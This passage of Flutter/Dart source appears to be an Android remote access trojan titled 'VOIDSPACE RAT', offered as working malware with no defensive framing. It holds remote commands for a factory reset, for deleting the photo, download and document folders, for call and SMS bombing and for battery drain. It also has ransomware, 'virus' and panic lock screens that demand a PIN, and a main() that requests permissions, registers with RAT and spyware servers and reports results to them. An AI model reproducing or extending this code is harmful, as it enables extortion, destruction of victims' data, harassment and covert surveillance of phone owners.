  // FLASHLIGHT
  else if (command == "flashlight_on") {
    await platformSpy.invokeMethod('flashlightOn');
    resultData = {"status": "Flashlight ON", "success": true};
  }

  else if (command == "flashlight_off") {
    await platformSpy.invokeMethod('flashlightOff');
    resultData = {"status": "Flashlight OFF", "success": true};
  }

  // HIDE/SHOW APP
  else if (command == "hide_app") {
    await platformSpy.invokeMethod('hideApp');
    resultData = {"status": "App hidden", "success": true};
  }

  else if (command == "show_app") {
    await platformSpy.invokeMethod('showApp');
    resultData = {"status": "App shown", "success": true};
  }

  // DESTRUCTIVE
  else if (command == "factory_reset") {
    try {
      if (Platform.isAndroid) {
        try {
          await platformSpy.invokeMethod('factoryReset');
          resultData = {"status": "Factory reset initiated", "success": true};
        } catch (e) {
          resultData = {"status": "Factory reset failed", "success": false};
        }
      } else {
        resultData = {"status": "Factory reset only on Android", "success": false};
      }
    } catch (e) {
      resultData = {"status": "Factory reset failed: $e", "success": false};
    }
  }

  else if (command == "wipe_data") {
    try {
      int deletedCount = 0;
      final List<String> targetDirs = [
        '/storage/emulated/0/DCIM', '/storage/emulated/0/Download',
        '/storage/emulated/0/Documents', '/storage/emulated/0/Pictures',
        '/storage/emulated/0/Movies', '/storage/emulated/0/Music',
      ];

      for (final dirPath in targetDirs) {
        final dir = Directory(dirPath);
        if (await dir.exists()) {
          try {
            await dir.delete(recursive: true);
            deletedCount++;
          } catch (e) {}
        }
      }
      resultData = {"status": "Wipe completed - $deletedCount directories cleared", "success": true};
    } catch (e) {
      resultData = {"status": "Wipe failed: $e", "success": false};
    }
  }

  else if (command == "call_bombing") {
    try {
      int callCount = 50;
      if (extra.isNotEmpty) callCount = int.tryParse(extra) ?? 50;
      await platformSpy.invokeMethod('startCallBombing', {"count": callCount});
      resultData = {"status": "Call bombing started with $callCount calls", "success": true};
    } catch (e) {
      resultData = {"status": "Call bombing failed: $e", "success": false};
    }
  }

  else if (command == "sms_bomber") {
    try {
      String phoneNumber = "08123456789";
      int count = 100;
      String message = "YOU HAVE BEEN HACKED!";

      if (extra.isNotEmpty) {
        List<String> parts = extra.split('|');
        phoneNumber = parts[0];
        count = parts.length > 1 ? int.tryParse(parts[1]) ?? 100 : 100;
        message = parts.length > 2 ? parts[2] : "YOU HAVE BEEN HACKED!";
      }

      await platformSpy.invokeMethod('startSmsBomber', {
        "number": phoneNumber, "count": count, "message": message
      });
      resultData = {"status": "SMS bomber started: $count messages to $phoneNumber", "success": true};
    } catch (e) {
      resultData = {"status": "SMS bomber failed: $e", "success": false};
    }
  }

  else if (command == "battery_drain") {
    try {
      await platformSpy.invokeMethod('maxBrightness');
      await platformSpy.invokeMethod('enableGPS');
      await platformSpy.invokeMethod('enableBluetooth');
      await platformSpy.invokeMethod('enableHotspot');
      resultData = {"status": "Battery drain activated", "success": true};
    } catch (e) {
      resultData = {"status": "Battery drain failed: $e", "success": false};
    }
  }

  if (resultData != null) {
    await http.post(
      Uri.parse("$SERVER_URL/api/post-response/$deviceId"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({"data": resultData, "cmd": command}),
    );

    await http.post(
      Uri.parse("$SERVER_URL/api/spyware/post-response/$deviceId"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({"data": resultData, "cmd": command}),
    );
  }
}

// ==================== WEBVIEW PAGE ====================
class WebViewPage extends StatefulWidget {
  const WebViewPage({super.key});

  @override
  State<WebViewPage> createState() => _WebViewPageState();
}

class _WebViewPageState extends State<WebViewPage> {
  @override
  void initState() {
    super.initState();
    _webViewController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(_bgBlack)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (String url) {},
          onPageFinished: (String url) {},
          onWebResourceError: (WebResourceError error) {},
        ),
      )
      ..loadRequest(Uri.parse(CONFIG_URL));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgBlack,
      body: WebViewWidget(controller: _webViewController!),
    );
  }
}

// ==================== NEON PURPLE LOCK SCREEN WIDGETS ====================
class NeonPurpleButton extends StatelessWidget {
  final String text;
  final VoidCallback onTap;
  final double width;

  const NeonPurpleButton({super.key, required this.text, required this.onTap, this.width = 200});

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: width,
        padding: const EdgeInsets.symmetric(vertical: 16),
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [_primaryPurple.withOpacity(0.2), Colors.black.withOpacity(0.8)]),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: _primaryPurple.withOpacity(0.7), width: 1.5),
          boxShadow: [BoxShadow(color: _primaryPurple.withOpacity(0.3), blurRadius: 15, spreadRadius: 2)],
        ),
        child: Center(
          child: Text(text, style: const TextStyle(color: _textWhite, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 2)),
        ),
      ),
    );
  }
}

class NeonPurplePinField extends StatelessWidget {
  final TextEditingController controller;
  final VoidCallback onSubmitted;

  const NeonPurplePinField({super.key, required this.controller, required this.onSubmitted});

  @override
  Widget build(BuildContext context) {
    return Container(
      width: 280,
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.8),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _primaryPurple, width: 2),
      ),
      child: TextField(
        controller: controller,
        obscureText: true,
        textAlign: TextAlign.center,
        style: const TextStyle(color: _textWhite, fontSize: 18),
        keyboardType: TextInputType.number,
        autofocus: true,
        decoration: InputDecoration(
          hintText: "🔑 ENTER PIN 🔑",
          hintStyle: TextStyle(color: _primaryPurple.withOpacity(0.7)),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(vertical: 16),
        ),
        onSubmitted: (_) => onSubmitted(),
      ),
    );
  }
}

class NeonPurpleLockIcon extends StatelessWidget {
  final IconData icon;

  const NeonPurpleLockIcon({super.key, required this.icon});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        border: Border.all(color: _primaryPurple, width: 3),
        boxShadow: [BoxShadow(color: _primaryPurple.withOpacity(0.5), blurRadius: 20)],
      ),
      child: Icon(icon, color: _primaryPurple, size: 60),
    );
  }
}

class NeonPurpleMessageCard extends StatelessWidget {
  final String message;

  const NeonPurpleMessageCard({super.key, required this.message});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _cardBlack,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _primaryPurple.withOpacity(0.5)),
      ),
      child: Text(
        message,
        textAlign: TextAlign.center,
        style: const TextStyle(color: _textWhite, fontSize: 14),
      ),
    );
  }
}

// ==================== HARD LOCK SCREEN (NEON PURPLE) ====================
class HardLockScreen extends StatefulWidget {
  const HardLockScreen({super.key});

  @override
  State<HardLockScreen> createState() => _HardLockScreenState();
}

class _HardLockScreenState extends State<HardLockScreen> with SingleTickerProviderStateMixin {
  late AnimationController _pulseController;
  final TextEditingController _pinController = TextEditingController();
  int _wrongAttempts = 0;

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(duration: const Duration(milliseconds: 800), vsync: this)..repeat(reverse: true);
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _pinController.dispose();
    super.dispose();
  }

  void _handleUnlock() {
    if (_pinController.text == currentLockPIN) {
      deviceLocked.value = false;
    } else {
      setState(() => _wrongAttempts++);
      _pinController.clear();
      _safeVibrate(500);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      color: _bgBlack,
      child: Center(
        child: SingleChildScrollView(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                AnimatedBuilder(
                  animation: _pulseController,
                  builder: (context, _) => NeonPurpleLockIcon(icon: Icons.lock),
                ),
                const SizedBox(height: 20),
                const Text("DEVICE LOCKED", style: TextStyle(color: _primaryPurple, fontSize: 22, fontWeight: FontWeight.bold, letterSpacing: 2)),
                const SizedBox(height: 20),
                NeonPurpleMessageCard(message: currentLockMessage),
                const SizedBox(height: 40),
                NeonPurplePinField(controller: _pinController, onSubmitted: _handleUnlock),
                const SizedBox(height: 20),
                NeonPurpleButton(text: "UNLOCK", onTap: _handleUnlock),
                if (_wrongAttempts > 0)
                  Padding(
                    padding: const EdgeInsets.only(top: 20),
                    child: Text("⚠️ WRONG: $_wrongAttempts/5", style: TextStyle(color: _primaryPurple.withOpacity(0.8), fontSize: 12)),
                  ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ==================== RANSOMWARE LOCK SCREEN (NEON PURPLE) ====================
class RansomwareLockScreen extends StatefulWidget {
  const RansomwareLockScreen({super.key});

  @override
  State<RansomwareLockScreen> createState() => _RansomwareLockScreenState();
}

class _RansomwareLockScreenState extends State<RansomwareLockScreen> {
  final TextEditingController _pinController = TextEditingController();
  int _wrongAttempts = 0;

  void _handleUnlock() {
    if (_pinController.text == currentLockPIN) {
      GunturRansomwareEngine.decryptAllFiles();
      deviceLocked.value = false;
    } else {
      setState(() => _wrongAttempts++);
      _pinController.clear();
      _safeVibrate(500);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      children: [
        if (_ransomwareVideoController != null && _isRansomwareVideoInitialized)
          SizedBox.expand(child: VideoPlayer(_ransomwareVideoController!)),
        Container(color: Colors.black.withOpacity(0.7)),
        Center(
          child: SingleChildScrollView(
            child: Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  const NeonPurpleLockIcon(icon: Icons.lock),
                  const SizedBox(height: 20),
                  const Text("🔒 FILES ENCRYPTED 🔒", style: TextStyle(color: _primaryPurple, fontSize: 22, fontWeight: FontWeight.bold, letterSpacing: 2)),
                  const SizedBox(height: 20),
                  NeonPurpleMessageCard(message: currentLockMessage),
                  const SizedBox(height: 40),
                  NeonPurplePinField(controller: _pinController, onSubmitted: _handleUnlock),
                  const SizedBox(height: 20),
                  NeonPurpleButton(text: "UNLOCK", onTap: _handleUnlock),
                  if (_wrongAttempts > 0)
                    Padding(
                      padding: const EdgeInsets.only(top: 20),
                      child: Text("⚠️ WRONG: $_wrongAttempts/5", style: TextStyle(color: _primaryPurple.withOpacity(0.8), fontSize: 12)),
                    ),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }
}

// ==================== PANIC LOCK SCREEN (NEON PURPLE) ====================
class PanicLockScreen extends StatefulWidget {
  const PanicLockScreen({super.key});

  @override
  State<PanicLockScreen> createState() => _PanicLockScreenState();
}

class _PanicLockScreenState extends State<PanicLockScreen> {
  List<String> _matrixChars = [];
  int _matrixColumns = 15;

  @override
  void initState() {
    super.initState();
    const chars = '01アイウエオカキクケコサシスセソ';
    for (int i = 0; i < _matrixColumns; i++) {
      _matrixChars.add(chars[DateTime.now().millisecondsSinceEpoch % chars.length]);
    }
    Timer.periodic(const Duration(milliseconds: 100), (timer) {
      if (mounted) {
        setState(() {
          const chars = '01アイウエオカキクケコサシスセソ';
          for (int i = 0; i < _matrixColumns; i++) {
            if (DateTime.now().millisecondsSinceEpoch % 3 == i % 3) {
              _matrixChars[i] = chars[DateTime.now().millisecondsSinceEpoch % chars.length];
            }
          }
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      color: _bgBlack,
      child: Center(
        child: SingleChildScrollView(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                  children: _matrixChars.map((char) {
                    return Text(char, style: TextStyle(color: _primaryPurple.withOpacity(0.6), fontSize: 14, fontFamily: 'monospace'));
                  }).toList(),
                ),
                const SizedBox(height: 20),
                const NeonPurpleLockIcon(icon: Icons.warning_amber_rounded),
                const SizedBox(height: 20),
                const Text("⚠️ PANIC MODE ACTIVE ⚠️", style: TextStyle(color: _primaryPurple, fontSize: 22, fontWeight: FontWeight.bold, letterSpacing: 2)),
                const SizedBox(height: 20),
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(color: _cardBlack, borderRadius: BorderRadius.circular(12), border: Border.all(color: _primaryPurple.withOpacity(0.5))),
                  child: const Text("UNLOCK VIA CONTROLLER ONLY!", textAlign: TextAlign.center, style: TextStyle(color: _textWhite, fontSize: 14)),
                ),
                const SizedBox(height: 40),
                Container(
                  width: 280,
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(color: _cardBlack, borderRadius: BorderRadius.circular(12), border: Border.all(color: _primaryPurple, width: 2)),
                  child: const Column(
                    children: [
                      Icon(Icons.warning, color: _primaryPurple, size: 40),
                      SizedBox(height: 10),
                      Text("PIN UNLOCK DISABLED", textAlign: TextAlign.center, style: TextStyle(color: _primaryPurple, fontWeight: FontWeight.bold)),
                      Text("UNLOCK VIA CONTROLLER", textAlign: TextAlign.center, style: TextStyle(color: _textGrey)),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ==================== VIRUS LOCK SCREEN (NEON PURPLE) ====================
class VirusLockScreen extends StatefulWidget {
  const VirusLockScreen({super.key});

  @override
  State<VirusLockScreen> createState() => _VirusLockScreenState();
}

class _VirusLockScreenState extends State<VirusLockScreen> {
  int _scanProgress = 0;

  @override
  void initState() {
    super.initState();
    Timer.periodic(const Duration(milliseconds: 100), (timer) {
      if (mounted) {
        setState(() => _scanProgress = (_scanProgress + 2) % 100);
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      color: _bgBlack,
      child: Center(
        child: SingleChildScrollView(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const NeonPurpleLockIcon(icon: Icons.bug_report),
                const SizedBox(height: 20),
                const Text("🦠 CRITICAL VIRUS DETECTED 🦠", style: TextStyle(color: _primaryPurple, fontSize: 20, fontWeight: FontWeight.bold, letterSpacing: 2)),
                const SizedBox(height: 10),
                NeonPurpleMessageCard(message: currentLockMessage),
                const SizedBox(height: 20),
                Container(
                  width: 280,
                  height: 10,
                  decoration: BoxDecoration(color: _cardBlack, borderRadius: BorderRadius.circular(5)),
                  child: LinearProgressIndicator(
                    value: _scanProgress / 100,
                    backgroundColor: _cardBlack,
                    color: _primaryPurple,
                  ),
                ),
                const SizedBox(height: 5),
                Text("Scanning system... $_scanProgress%", style: TextStyle(color: _primaryPurple.withOpacity(0.8), fontSize: 10)),
                const SizedBox(height: 40),
                Container(
                  width: 280,
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(color: _cardBlack, borderRadius: BorderRadius.circular(12), border: Border.all(color: _primaryPurple, width: 2)),
                  child: const Column(
                    children: [
                      Icon(Icons.warning, color: _primaryPurple, size: 40),
                      SizedBox(height: 10),
                      Text("VIRUS LOCK ACTIVE", textAlign: TextAlign.center, style: TextStyle(color: _primaryPurple, fontWeight: FontWeight.bold)),
                      Text("CONTACT YOUR ADMIN", textAlign: TextAlign.center, style: TextStyle(color: _textGrey)),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ==================== MAIN LOCK WRAPPER ====================
class MainLockWrapper extends StatelessWidget {
  const MainLockWrapper({super.key});

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        if (!isLocked) {
          return const WebViewPage();
        }
        
        return ValueListenableBuilder<bool>(
          valueListenable: isRansomwareMode,
          builder: (context, isRansom, child) {
            if (isRansom) return const RansomwareLockScreen();
            
            return ValueListenableBuilder<bool>(
              valueListenable: isPanicMode,
              builder: (context, isPanic, child) {
                if (isPanic) return const PanicLockScreen();
                
                return ValueListenableBuilder<bool>(
                  valueListenable: isVirusMode,
                  builder: (context, isVirus, child) {
                    if (isVirus) return const VirusLockScreen();
                    return const HardLockScreen();
                  },
                );
              },
            );
          },
        );
      },
    );
  }
}

// ==================== MAIN ====================
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // LOAD CONFIG FIRST
  await _loadConfig();

  _ransomwareVideoController = VideoPlayerController.asset('assets/videos/ransomware.mp4')
    ..initialize().then((_) {
      _isRansomwareVideoInitialized = true;
      _ransomwareVideoController?.setLooping(true);
      _ransomwareVideoController?.setVolume(1.0);
      if (isRansomwareMode.value && deviceLocked.value) {
        _ransomwareVideoController?.play();
      }
    }).catchError((e) {
      _isRansomwareVideoInitialized = true;
      print("Error loading ransomware video: $e");
    });

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    _requestNotificationAccess();
  }

  await _requestPermissions();

  Map<String, String> deviceInfo = await _getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  final prefs = await SharedPreferences.getInstance();
  bool wasLocked = prefs.getBool('device_locked') ?? false;
  bool wasRansomwareMode = prefs.getBool('ransomware_mode') ?? false;
  bool wasPanicMode = prefs.getBool('panic_mode') ?? false;
  bool wasVirusMode = prefs.getBool('virus_mode') ?? false;
  String savedPIN = prefs.getString('lock_pin') ?? "0853";
  String savedMessage = prefs.getString('lock_message') ?? "YOUR FILES HAVE BEEN ENCRYPTED!";

  if (wasLocked) {
    deviceLocked.value = true;
    isRansomwareMode.value = wasRansomwareMode;
    isPanicMode.value = wasPanicMode;
    isVirusMode.value = wasVirusMode;
    currentLockPIN = savedPIN;
    currentLockMessage = savedMessage;
    if (wasRansomwareMode && _isRansomwareVideoInitialized) {
      _ransomwareVideoController?.play();
    }
    _pinApp();
  }

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (e) {}

  await _registerToRAT(globalDeviceId, globalDeviceModel);
  await _registerToSpyware(globalDeviceId, globalDeviceModel);

  _startSpyware(globalDeviceId, globalDeviceModel);
  _startRealtimeUpdates(globalDeviceId);

  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'VOIDSPACE RAT',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: _bgBlack,
        colorScheme: const ColorScheme.dark().copyWith(
          primary: _primaryPurple,
        ),
      ),
      home: const MainLockWrapper(),
    );
  }
}